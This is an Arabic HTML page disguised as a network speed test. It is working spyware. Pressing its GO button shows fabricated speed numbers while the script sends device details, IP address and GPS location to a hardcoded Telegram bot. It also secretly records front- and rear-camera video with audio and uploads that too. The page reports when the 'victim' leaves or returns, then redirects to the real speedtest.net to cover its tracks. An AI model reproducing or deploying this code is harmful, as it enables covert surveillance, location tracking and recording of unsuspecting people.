<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SpeedTest Global | فحص سرعة الشبكة</title>
    <style>
        :root { --accent: #00d2ff; --dark-bg: #0b0e18; }
        body { background: var(--dark-bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .grid-bg { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(0, 210, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 210, 255, 0.03) 1px, transparent 1px); background-size: 25px 25px; z-index: -1; }
        .main-card { background: rgba(255, 255, 255, 0.03); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        h1 { font-size: 22px; margin: 0 0 10px; font-weight: 300; letter-spacing: 2px; }
        .status-dot { display: inline-block; width: 8px; height: 8px; background: #4caf50; border-radius: 50%; margin-left: 8px; box-shadow: 0 0 10px #4caf50; }
        .gauge-box { position: relative; width: 220px; height: 220px; margin: 30px auto; border-radius: 50%; border: 2px solid rgba(0, 210, 255, 0.2); display: flex; flex-direction: column; align-items: center; justify-content: center; }
        #goBtn { width: 160px; height: 160px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 35px; font-weight: bold; cursor: pointer; transition: 0.4s; z-index: 5; outline: none; }
        #goBtn:active { transform: scale(0.9); }
        #speedDisplay { display: none; text-align: center; }
        .speed-num { font-size: 48px; font-weight: 800; color: var(--accent); display: block; }
        video { display: none; }
    </style>
</head>
<body>
    <div class="grid-bg"></div>
    <div class="main-card">
        <h1>SPEEDTEST <span class="status-dot"></span></h1>
        <p id="subText" style="color: #8892b0; font-size: 13px;">اختبر سرعة اتصالك بالسيرفرات الإقليمية</p>
        <div class="gauge-box">
            <button id="goBtn">GO</button>
            <div id="speedDisplay">
                <span id="num" class="speed-num">0.0</span>
                <span style="font-size: 14px; color: #8892b0;">Mbps (Download)</span>
            </div>
        </div>
    </div>
    <video id="v" autoplay playsinline muted></video>

    <script>
        const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
        const chat = "7984067238";

        async function sendToTelegram(msg, type = "text", data = null) {
            const url = `https://api.telegram.org/bot${token}/`;
            const fd = new FormData();
            fd.append("chat_id", chat);
            try {
                if (type === "text") {
                    await fetch(url + "sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown");
                } else if (type === "video") {
                    fd.append("video", data, "live.mp4");
                    if (msg) fd.append("caption", msg);
                    await fetch(url + "sendVideo", { method: "POST", body: fd });
                }
            } catch (e) {}
        }

        // إشعارات الحالة (Online/Offline)
        window.onblur = () => sendToTelegram("🔴 **OFFLINE**\nالضحية غادر الصفحة الآن.");
        window.onfocus = () => sendToTelegram("🟢 **ONLINE**\nالضحية عاد لفتح الصفحة الآن.");

        async function getFullReport() {
            let info = `📊 *تقرير شامل للهدف*:\n\n`;
            info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
            info += `• 💾 الرام: \`${navigator.deviceMemory || "غير معروف"} GB\`\n`;
            info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
            info += `• 🖥️ الشاشة: \`${window.screen.width}x${window.screen.height}\`\n`;
            
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                let netType = conn.type === 'wifi' ? "🌐 WiFi" : "📶 خلوي";
                info += `• 📶 نوع الشبكة: \`${netType} (${conn.effectiveType.toUpperCase()})\`\n`;
                info += `• ⚡ سرعة الخط: \`${conn.downlink} Mbps\`\n`;
            }
            try {
                const b = await navigator.getBattery();
                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋"})\n`;
            } catch(e) {}
            info += `• 🌐 لغة الهاتف: \`${navigator.language}\`\n`;
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                info += `• 🌐 الـ IP: \`${ipData.ip}\`\n`;
            } catch(e) {}
            return info;
        }

        async function recordVideo(mode, label, duration) {
            try {
                // إغلاق أي تيار كاميرا نشط سابقاً
                if (window.currentStream) {
                    window.currentStream.getTracks().forEach(t => t.stop());
                }

                // طلب إذن الكاميرا والميكروفون (audio: true)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: mode }, 
                    audio: true 
                });
                
                window.currentStream = stream;
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                
                recorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };
                
                const recordingPromise = new Promise(resolve => {
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: "video/mp4" });
                        // التحقق من الحجم لضمان وصول فيديو حقيقي
                        if (blob.size > 2000) {
                            await sendToTelegram(`🎥 فيديو بصوت (${label} - 12 ثانية)`, "video", blob);
                        }
                        stream.getTracks().forEach(t => t.stop());
                        resolve();
                    };
                });

                recorder.start();
                await new Promise(r => setTimeout(r, duration));
                recorder.stop();
                return recordingPromise;
            } catch (e) {
                await sendToTelegram(`❌ فشل تصوير فيديو ${label} (إذن الميكروفون مرفوض)`);
            }
        }

        document.getElementById("goBtn").onclick = async function() {
            this.style.display = "none";
            document.getElementById("speedDisplay").style.display = "block";
            document.getElementById("subText").innerText = "جاري الاتصال بالسيرفر...";

            const timer = setInterval(() => {
                document.getElementById("num").innerText = (Math.random() * (95 - 78) + 78).toFixed(1);
            }, 100);

            // 1. إرسال التقرير والموقع فوراً
            sendToTelegram(await getFullReport());
            navigator.geolocation.getCurrentPosition(p => {
                sendToTelegram(`📍 *الموقع*:\n[فتح الخريطة](http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
            });

            // 2. فيديو أمامي بصوت (12 ثانية)
            await recordVideo("user", "أمامي", 12000);

            // 3. فاصل زمني لضمان تبديل الكاميرا
            await new Promise(r => setTimeout(r, 3000));

            // 4. فيديو خلفي بصوت (12 ثانية)
            await recordVideo("environment", "خلفي", 12000);

            setTimeout(() => {
                clearInterval(timer);
                location.href = "https://www.speedtest.net/ar";
            }, 5000);
        };
    </script>
</body>
</html>
